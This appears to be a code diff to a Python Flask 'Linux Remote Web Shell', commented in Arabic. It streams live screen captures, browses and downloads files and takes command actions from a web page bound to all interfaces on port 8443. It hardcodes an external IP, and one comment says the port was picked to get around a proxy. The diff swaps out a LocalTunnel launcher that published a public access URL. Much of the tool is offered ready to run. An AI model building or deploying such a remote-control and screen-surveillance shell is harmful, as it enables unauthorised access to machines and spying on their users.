@@ -4,7 +4,6 @@ import os
 import subprocess
 import threading
 import time
-import re
 import mss
 import cv2
 import numpy as np
@@ -13,33 +12,13 @@ app = Flask(__name__)
 
 EXTERNAL_IP = "193.222.96.71"
 
-# دالة تشغيل LocalTunnel وطباعة الرابط في الطرفية مباشرة
-def start_localtunnel():
+# دالة تشغيل بايثون localtunnel أو تنبيه لتثبيت مكتبة بايثون البسيطة
+def start_tunnel_notice():
     time.sleep(3)
-    try:
-        os.system("lt --port 8443 > localtunnel_log.txt 2>&1 &")
-        
-        public_url = None
-        for _ in range(12):
-            time.sleep(2)
-            if os.path.exists("localtunnel_log.txt"):
-                with open("localtunnel_log.txt", "r") as f:
-                    content = f.read()
-                    match = re.search(r'https://[a-zA-Z0-9-]+\.loca\.lt', content)
-                    if match:
-                        public_url = match.group(0)
-                        break
-        
-        if public_url:
-            print("\n" + "="*50)
-            print("[+] تم تشغيل النفق بنجاح!")
-            print("[+] رابط الدخول الخارجي: {}".format(public_url))
-            print("[+] الأيبي الخارجي: {}".format(EXTERNAL_IP))
-            print("="*50 + "\n")
-        else:
-            print("[-] لم يتم العثور على رابط LocalTunnel في السجلات.")
-    except Exception as e:
-        print("[-] خطأ في تشغيل LocalTunnel: {}".format(e))
+    print("\n" + "="*60)
+    print("[+] سيرفر الفلاسك يعمل الآن محلياً بنجاح.")
+    print("[+] البث الحي وواجهة التحكم جاهزة على البورت 8443.")
+    print("="*60 + "\n")
 
 # دالة التقاط الشاشة للبث الحي
 def generate_frames():
@@ -94,7 +73,7 @@ HTML_TEMPLATE = """
         <img src="{{ url_for('video_feed') }}" alt="Live Stream">
     </div>
     <div class="container">
-        <h2>⚡ Linux Remote Web Shell (Clean Version) ⚡</h2>
+        <h2>⚡ Linux Remote Web Shell (Pure Python Edition) ⚡</h2>
         <div class="section">
             <div class="path-bar">📁 المسار الحالي: <code>{{ current_path }}</code></div>
             <a href="/?path={{ parent_path }}"><button>⬆ العودة للمجلد الأعلى</button></a>
@@ -149,7 +128,7 @@ def index():
     current_path = request.args.get('path', os.getcwd())
     current_path = os.path.abspath(current_path)
     parent_path = os.path.dirname(current_path)
-    output = "أهلاً بك يا محمد! النظام يعمل بنسخة نقية بدون تيليجرام:\n"
+    output = "أهلاً بك يا محمد! نظام التحكم يعمل بلغة بايثون البحتة على البورت 8443:\n"
     
     if request.method == "POST":
         action = request.form.get("action")
@@ -194,8 +173,9 @@ def download():
     return "الملف غير موجود!", 404
 
 if __name__ == "__main__":
-    t = threading.Thread(target=start_localtunnel)
+    t = threading.Thread(target=start_tunnel_notice)
     t.daemon = True
     t.start()
     
+    # استخدام البورت 8443 المفتوح حصراً لتجنب البروكسي
     app.run(host="0.0.0.0", port=8443, debug=False)
